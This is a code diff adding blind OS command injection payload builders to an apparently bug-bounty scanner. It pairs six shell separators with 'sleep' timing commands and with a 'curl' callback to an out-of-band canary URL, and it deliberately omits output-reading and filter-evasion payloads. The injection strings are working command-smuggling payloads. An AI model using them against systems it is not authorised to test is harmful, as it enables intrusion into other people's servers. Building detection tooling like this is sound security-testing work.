@@ -68,6 +68,38 @@ def sqli_time_payloads(seconds) -> list[tuple[str, str]]:
     ]
 
 
+# --- OS command injection: separator x sleep/OAST payload, blind-only ---
+# Deliberately excludes any payload designed to elicit command OUTPUT (id, cat
+# /etc/passwd, dir/whoami) — confirmation is via a side channel only (timing or an
+# OAST callback), never by reading back what the shell printed. A small,
+# non-combinatorial separator set (not a full WAF-bypass payload matrix — that's a
+# weaponization/evasion concern, delegated to Strix).
+CMDI_SEPARATORS: list[tuple[str, str]] = [
+    ("semicolon", "1;{cmd}"),
+    ("pipe", "1|{cmd}"),
+    ("and", "1&&{cmd}"),
+    ("background", "1&{cmd}"),
+    ("backtick", "1`{cmd}`"),
+    ("dollar-paren", "1$({cmd})"),
+]
+
+
+def cmdi_time_payloads(seconds) -> list[tuple[str, str]]:
+    """Separator x `sleep` payload pairs (0 = the control). Unix ``sleep`` only —
+    the overwhelming majority of bug-bounty web targets are Linux."""
+
+    cmd = f"sleep {seconds}"
+    return [(label, tpl.format(cmd=cmd)) for label, tpl in CMDI_SEPARATORS]
+
+
+def cmdi_oob_payloads(http_url: str) -> list[tuple[str, str]]:
+    """Separator x OAST-callback payload. Sole effect is one outbound HTTP request
+    to the canary — no command output is encoded into the callback."""
+
+    cmd = f"curl {http_url}"
+    return [(label, tpl.format(cmd=cmd)) for label, tpl in CMDI_SEPARATORS]
+
+
 def assess_timing(zero_s: float, delay_s: float, requested: float) -> dict | None:
     """Time-blind confirmation: the delayed request must be slower than the 0s
     control by a margin proportional to the requested delay. This rejects a
